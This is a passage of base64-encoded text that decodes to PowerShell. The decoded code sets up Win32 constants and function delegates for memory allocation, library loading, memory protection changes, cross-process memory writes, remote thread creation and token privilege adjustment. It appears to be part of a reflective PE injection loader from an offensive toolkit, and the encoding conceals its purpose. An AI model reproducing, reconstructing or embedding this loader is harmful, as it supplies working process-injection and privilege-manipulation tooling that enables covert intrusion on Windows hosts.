xCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9SRUFET05MWSAtVmFsdWUgMHgwMgoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfUkVBRFdSSVRFIC1WYWx1ZSAweDA0CgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9XUklURUNPUFkgLVZhbHVlIDB4MDgKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX0VYRUNVVEUgLVZhbHVlIDB4MTAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX0VYRUNVVEVfUkVBRCAtVmFsdWUgMHgyMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUgLVZhbHVlIDB4NDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX0VYRUNVVEVfV1JJVEVDT1BZIC1WYWx1ZSAweDgwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9OT0NBQ0hFIC1WYWx1ZSAweDIwMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1JFTF9CQVNFRF9BQlNPTFVURSAtVmFsdWUgMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1JFTF9CQVNFRF9ISUdITE9XIC1WYWx1ZSAzCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfUkVMX0JBU0VEX0RJUjY0IC1WYWx1ZSAxMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fRElTQ0FSREFCTEUgLVZhbHVlIDB4MDIwMDAwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX0VYRUNVVEUgLVZhbHVlIDB4MjAwMDAwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX1JFQUQgLVZhbHVlIDB4NDAwMDAwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX1dSSVRFIC1WYWx1ZSAweDgwMDAwMDAwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfU0NOX01FTV9OT1RfQ0FDSEVEIC1WYWx1ZSAweDA0MDAwMDAwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTUVNX0RFQ09NTUlUIC1WYWx1ZSAweDQwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9GSUxFX0VYRUNVVEFCTEVfSU1BR0UgLVZhbHVlIDB4MDAwMgoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0ZJTEVfRExMIC1WYWx1ZSAweDIwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFIC1WYWx1ZSAweDQwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCAtVmFsdWUgMHgxMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fUkVMRUFTRSAtVmFsdWUgMHg4MDAwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVE9LRU5fUVVFUlkgLVZhbHVlIDB4MDAwOAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFRPS0VOX0FESlVTVF9QUklWSUxFR0VTIC1WYWx1ZSAweDAwMjAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBTRV9QUklWSUxFR0VfRU5BQkxFRCAtVmFsdWUgMHgyCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRVJST1JfTk9fVE9LRU4gLVZhbHVlIDB4M2YwCgkJCgkJcmV0dXJuICRXaW4zMkNvbnN0YW50cwoJfQoKCUZ1bmN0aW9uIEdldC1XaW4zMkZ1bmN0aW9ucwoJewoJCSRXaW4zMkZ1bmN0aW9ucyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAoJCQoJCSRWaXJ0dWFsQWxsb2NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MKCQkkVmlydHVhbEFsbG9jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCgkJJFZpcnR1YWxBbGxvYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NBZGRyLCAkVmlydHVhbEFsbG9jRGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbEFsbG9jIC1WYWx1ZSAkVmlydHVhbEFsbG9jCgkJCgkJJFZpcnR1YWxBbGxvY0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jRXgKCQkkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCgkJJFZpcnR1YWxBbGxvY0V4ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxBbGxvY0V4QWRkciwgJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbEFsbG9jRXggLVZhbHVlICRWaXJ0dWFsQWxsb2NFeAoJCQoJCSRtZW1jcHlBZGRyID0gR2V0LVByb2NBZGRyZXNzIG1zdmNydC5kbGwgbWVtY3B5CgkJJG1lbWNweURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdKSAoW0ludFB0cl0pCgkJJG1lbWNweSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRtZW1jcHlBZGRyLCAkbWVtY3B5RGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgbWVtY3B5IC1WYWx1ZSAkbWVtY3B5CgkJCgkJJG1lbXNldEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgbXN2Y3J0LmRsbCBtZW1zZXQKCQkkbWVtc2V0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCgkJJG1lbXNldCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRtZW1zZXRBZGRyLCAkbWVtc2V0RGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgbWVtc2V0IC1WYWx1ZSAkbWVtc2V0CgkJCgkJJExvYWRMaWJyYXJ5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgTG9hZExpYnJhcnlBCgkJJExvYWRMaWJyYXJ5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10pIChbSW50UHRyXSkKCQkkTG9hZExpYnJhcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTG9hZExpYnJhcnlBZGRyLCAkTG9hZExpYnJhcnlEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBMb2FkTGlicmFyeSAtVmFsdWUgJExvYWRMaWJyYXJ5CgkJCgkJJEdldFByb2NBZGRyZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0UHJvY0FkZHJlc3MKCQkkR2V0UHJvY0FkZHJlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1N0cmluZ10pIChbSW50UHRyXSkKCQkkR2V0UHJvY0FkZHJlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0UHJvY0FkZHJlc3NBZGRyLCAkR2V0UHJvY0FkZHJlc3NEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRQcm9jQWRkcmVzcyAtVmFsdWUgJEdldFByb2NBZGRyZXNzCgkJCgkJJEdldFByb2NBZGRyZXNzSW50UHRyQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0UHJvY0FkZHJlc3MgI1RoaXMgaXMgc3RpbGwgR2V0UHJvY0FkZHJlc3MsIGJ1dCBpbnN0ZWFkIG9mIFBvd2VyU2hlbGwgY29udmVydGluZyB0aGUgc3RyaW5nIHRvIGEgcG9pbnRlciwgeW91IG11c3QgZG8gaXQgeW91cnNlbGYKCQkkR2V0UHJvY0FkZHJlc3NJbnRQdHJEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKCQkkR2V0UHJvY0FkZHJlc3NJbnRQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0UHJvY0FkZHJlc3NJbnRQdHJBZGRyLCAkR2V0UHJvY0FkZHJlc3NJbnRQdHJEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRQcm9jQWRkcmVzc0ludFB0ciAtVmFsdWUgJEdldFByb2NBZGRyZXNzSW50UHRyCgkJCgkJJFZpcnR1YWxGcmVlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEZyZWUKCQkkVmlydHVhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSkgKFtCb29sXSkKCQkkVmlydHVhbEZyZWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVBZGRyLCAkVmlydHVhbEZyZWVEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsRnJlZSAtVmFsdWUgJFZpcnR1YWxGcmVlCgkJCgkJJFZpcnR1YWxGcmVlRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZUV4CgkJJFZpcnR1YWxGcmVlRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0pIChbQm9vbF0pCgkJJFZpcnR1YWxGcmVlRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVFeEFkZHIsICRWaXJ0dWFsRnJlZUV4RGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbEZyZWVFeCAtVmFsdWUgJFZpcnR1YWxGcmVlRXgKCQkKCQkkVmlydHVhbFByb3RlY3RBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsUHJvdGVjdAoJCSRWaXJ0dWFsUHJvdGVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCgkJJFZpcnR1YWxQcm90ZWN0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxQcm90ZWN0QWRkciwgJFZpcnR1YWxQcm90ZWN0RGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbFByb3RlY3QgLVZhbHVlICRWaXJ0dWFsUHJvdGVjdAoJCQoJCSRHZXRNb2R1bGVIYW5kbGVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRNb2R1bGVIYW5kbGVBCgkJJEdldE1vZHVsZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtTdHJpbmddKSAoW0ludFB0cl0pCgkJJEdldE1vZHVsZUhhbmRsZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRNb2R1bGVIYW5kbGVBZGRyLCAkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgR2V0TW9kdWxlSGFuZGxlIC1WYWx1ZSAkR2V0TW9kdWxlSGFuZGxlCgkJCgkJJEZyZWVMaWJyYXJ5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRnJlZUxpYnJhcnkKCQkkRnJlZUxpYnJhcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbQm9vbF0pIChbSW50UHRyXSkKCQkkRnJlZUxpYnJhcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkRnJlZUxpYnJhcnlBZGRyLCAkRnJlZUxpYnJhcnlEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGcmVlTGlicmFyeSAtVmFsdWUgJEZyZWVMaWJyYXJ5CgkJCgkJJE9wZW5Qcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgT3BlblByb2Nlc3MKCSAgICAkT3BlblByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQoJICAgICRPcGVuUHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRPcGVuUHJvY2Vzc0FkZHIsICRPcGVuUHJvY2Vzc0RlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE9wZW5Qcm9jZXNzIC1WYWx1ZSAkT3BlblByb2Nlc3MKCQkKCQkkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QKCSAgICAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSkgKFtVSW50MzJdKQoJICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyLCAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFdhaXRGb3JTaW5nbGVPYmplY3QgLVZhbHVlICRXYWl0Rm9yU2luZ2xlT2JqZWN0CgkJCgkJJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdyaXRlUHJvY2Vzc01lbW9yeQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyLCAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgV3JpdGVQcm9jZXNzTWVtb3J5IC1WYWx1ZSAkV3JpdGVQcm9jZXNzTWVtb3J5CgkJCgkJJFJlYWRQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgUmVhZFByb2Nlc3NNZW1vcnkKICAgICAgICAkUmVhZFByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFJlYWRQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFJlYWRQcm9jZXNzTWVtb3J5QWRkciwgJFJlYWRQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUmVhZFByb2Nlc3NNZW1vcnkgLVZhbHVlICRSZWFkUHJvY2Vzc01lbW9yeQoJCQoJCSRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVSZW1vdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgQ3JlYXRlUmVtb3RlVGhyZWFkIC1WYWx1ZSAkQ3JlYXRlUmVtb3RlVGhyZWFkCgkJCgkJJEdldEV4aXRDb2RlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0RXhpdENvZGVUaHJlYWQKICAgICAgICAkR2V0RXhpdENvZGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJEdldEV4aXRDb2RlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldEV4aXRDb2RlVGhyZWFkQWRkciwgJEdldEV4aXRDb2RlVGhyZWFkRGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgR2V0RXhpdENvZGVUaHJlYWQgLVZhbHVlICRHZXRFeGl0Q29kZVRocmVhZAoJCQoJCSRPcGVuVGhyZWFkVG9rZW5BZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBPcGVuVGhyZWFkVG9rZW4KICAgICAgICAkT3BlblRocmVhZFRva2VuRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbQm9vbF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkT3BlblRocmVhZFRva2VuID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5UaHJlYWRUb2tlbkFkZHIsICRPcGVuVGhyZWFkVG9rZW5EZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBPcGVuVGhyZWFkVG9rZW4gLVZhbHVlICRPcGVuVGhyZWFkVG9rZW4KCQkKCQkkR2V0Q3VycmVudFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldEN1cnJlbnRUaHJlYWQKICAgICAgICAkR2V0Q3VycmVudFRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtJbnRQdHJdKQogICAgICAgICRHZXRDdXJyZW50VGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldEN1cnJlbnRUaHJlYWRBZGRyLCAkR2V0Q3VycmVudFRocmVhZERlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEdldEN1cnJlbnRUaHJlYWQgLVZhbHVlICRHZXRDdXJyZW50VGhyZWFkCgkJCgkJJEFkanVzdFRva2VuUHJpdmlsZWdlc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIEFkanVzdFRva2VuUHJpdmlsZWdlcwogICAgICAgICRBZGp1c3RUb2tlblByaXZpbGVnZXNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEFkanVzdFRva2VuUHJpdmlsZWdlc0FkZHIsICRBZGp1c3RUb2tlblByaXZpbGVnZXNEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBBZGp1c3RUb2tlblByaXZpbGVnZXMgLVZhbHVlICRBZGp1c3RUb2tlblByaXZpbGVnZXMKCQkKCQkkTG9va3VwUHJpdmlsZWdlVmFsdWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBMb29rdXBQcml2aWxlZ2VWYWx1ZUEKICAgICAgICAkTG9va3VwUHJpdmlsZWdlVmFsdWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICRMb29rdXBQcml2aWxlZ2VWYWx1ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRMb29rdXBQcml2aWxlZ2VWYWx1ZUFkZHIsICRMb29rdXBQcml2aWxlZ2VWY